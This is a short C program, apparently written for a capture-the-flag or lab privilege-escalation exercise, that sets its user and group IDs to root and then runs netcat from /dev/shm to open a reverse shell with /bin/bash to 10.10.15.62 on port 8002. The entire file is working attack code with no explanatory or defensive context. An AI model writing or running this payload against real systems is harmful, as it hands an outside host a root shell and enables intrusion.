#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void main() {
    setgid(0);
    setuid(0);
    system("/dev/shm/nc 10.10.15.62 8002 -e /bin/bash");
}
